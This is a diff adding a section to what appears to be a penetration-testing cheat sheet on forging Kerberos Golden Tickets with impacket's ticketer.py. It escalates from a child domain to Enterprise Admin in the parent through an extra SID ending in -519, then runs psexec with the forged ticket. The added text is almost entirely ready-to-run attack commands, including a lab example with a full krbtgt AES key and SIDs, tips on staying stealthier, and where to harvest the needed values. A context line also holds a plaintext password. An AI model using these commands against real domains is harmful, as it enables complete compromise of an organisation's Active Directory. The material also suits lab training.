@@ -198,7 +198,48 @@ export KRB5CCNAME=o.foller.ccache
 ```
 python3 getST.py zeus.corp/o.foller:EarlyMorningFootball777 -spn cifs/TARGET -dc-ip 192.168.158.158
 ```
+---
 
+## ticketer.py — Forge Kerberos Tickets (Golden/Silver Ticket attacks)
+
+### Golden Ticket — forge a TGT using krbtgt hash (full domain access)
+```
+# Using NTLM hash
+python3 ticketer.py -nthash KRBTGT_NTLM -domain child.domain.com -domain-sid CHILD_SID -extra-sid PARENT_SID-519 Administrator
+
+# Using AES256 key (preferred — looks more legitimate)
+python3 ticketer.py -aesKey KRBTGT_AES256 -domain child.domain.com -domain-sid CHILD_SID -extra-sid PARENT_SID-519 Administrator
+```
+
+### Real example from Poseidon lab (child → parent domain):
+```
+python3 ticketer.py -aesKey b2304e451b53dc5e71c08ddd0fd06a3803d8f14243020fd46c80ad44ec75d2a2 -domain sub.poseidon.yzx -domain-sid S-1-5-21-4168247447-1722543658-2110108262 -extra-sid S-1-5-21-1190331060-1711709193-932631991-519 Administrator
+```
+
+### Load and use the ticket:
+```
+export KRB5CCNAME=Administrator.ccache
+python3 psexec.py child.domain.com/Administrator@DC01.parent.domain.com -k -no-pass
+```
+
+### Flag breakdown:
+```
+-nthash       krbtgt NTLM hash (less preferred)
+-aesKey       krbtgt AES256 key (preferred, stealthier)
+-domain       the child domain you own (FQDN)
+-domain-sid   SID of the child domain
+-extra-sid    SID of the parent domain + -519 (Enterprise Admins group)
+              The -519 is what gives you Enterprise Admin rights in parent
+-k            Use Kerberos ticket from KRB5CCNAME
+-no-pass      Don't prompt for password
+```
+
+### Where to get the values needed:
+```
+krbtgt hash/aesKey  → secretsdump output (ntds.dit dump)
+domain-sid          → nltest /domain_trusts /v (run from any domain machine)
+extra-sid           → nltest /domain_trusts /v (parent domain SID) + append -519
+```
 ---
 
 ## Enumeration Scripts
